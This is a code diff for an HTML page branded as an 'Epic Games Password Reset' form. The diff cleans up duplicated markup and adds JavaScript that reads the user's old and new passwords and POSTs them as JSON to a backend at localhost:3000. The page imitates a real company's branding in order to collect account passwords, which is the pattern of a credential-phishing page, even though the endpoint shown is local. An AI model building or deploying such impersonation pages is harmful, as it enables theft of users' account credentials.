@@ -1,8 +1,10 @@
 <!DOCTYPE html>
-<html>
-<head><link rel="stylesheet" href="epicgames-html-password.css">
-
-    <title>Enter Your New Password</title>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Epic Games Password Reset</title>
+    <link rel="stylesheet" href="epicgames-html-password.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
 
@@ -31,7 +33,7 @@
         }
 
         .logo img {
-            width: 100px; /* Adjusted size */
+            width: 100px; /* Adjusted logo size */
             height: auto;
         }
 
@@ -44,14 +46,6 @@
             color: #f5f5f5;
         }
 
-       <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Epic Games Password Reset</title>
-    <link rel="stylesheet" href="epicgames-html-password.css">
-    <style>
         .form-group {
             margin-bottom: 15px;
             position: relative;
@@ -154,7 +148,7 @@
         .logo img {
             display: block;
             margin: 0 auto 20px;
-            width: 150px;
+            width: 100px; /* Adjusted logo size */
         }
 
         .MuiTypography-root {
@@ -178,7 +172,7 @@
         </div>
 
         <!-- Form Section -->
-        <form action="http://localhost:3000/reset-password" method="POST">
+        <form id="resetPasswordForm">
             <!-- Old Password Section -->
             <div class="form-group">
                 <label for="oldPassword">Old Password</label>
@@ -216,6 +210,33 @@
             const field = document.getElementById(fieldId);
             field.type = field.type === 'password' ? 'text' : 'password';
         }
+
+        // AJAX Form Submission
+        document.getElementById('resetPasswordForm').addEventListener('submit', async function(event) {
+            event.preventDefault();  // Prevent form from submitting the normal way
+
+            const oldPassword = document.getElementById('oldPassword').value;
+            const newPassword = document.getElementById('newPassword').value;
+
+            // Send POST request to backend
+            const response = await fetch('http://localhost:3000/reset-password', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    oldPassword: oldPassword,
+                    newPassword: newPassword
+                })
+            });
+
+            if (response.ok) {
+                const data = await response.text();
+                alert(data);  // Display the success message
+            } else {
+                alert('There was an error resetting the password.');
+            }
+        });
     </script>
 </body>
 </html>
